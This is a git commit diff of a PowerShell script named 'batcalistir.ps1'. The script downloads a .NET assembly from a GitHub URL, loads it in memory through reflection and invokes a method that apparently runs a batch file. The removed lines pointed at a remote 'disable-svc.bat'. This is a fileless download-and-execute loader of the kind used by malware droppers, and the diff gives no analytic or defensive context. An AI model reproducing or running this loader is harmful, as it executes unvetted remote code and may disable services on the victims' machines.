00b63c64a248de57798dfe34109fce71da839093
Moz <63475375+pipezilla@users.noreply.github.com>
2022-06-19 11:08:36 +0300

    Update batcalistir.ps1

--- batcalistir.ps1
+++ batcalistir.ps1
@@ -3,5 +3,4 @@ $data = (New-Object System.Net.WebClient).DownloadData('https://github.com/pipez
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("batcalistir")
-$urlu = "https://raw.githubusercontent.com/pipezilla/msadev/main/disable-svc.bat"
-$method.Invoke(1, $urlu)
+$method.Invoke(0, $null)
